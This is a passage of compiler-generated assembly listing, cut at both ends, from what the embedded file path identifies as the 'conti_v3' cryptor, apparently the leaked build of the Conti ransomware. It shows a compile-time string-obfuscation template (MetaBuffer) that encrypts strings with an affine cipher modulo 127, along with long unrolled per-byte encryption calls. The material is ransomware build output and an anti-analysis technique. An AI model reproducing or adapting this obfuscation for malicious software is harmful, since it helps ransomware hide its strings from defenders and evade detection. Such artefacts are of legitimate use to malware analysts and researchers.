	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv560 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<37,42,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
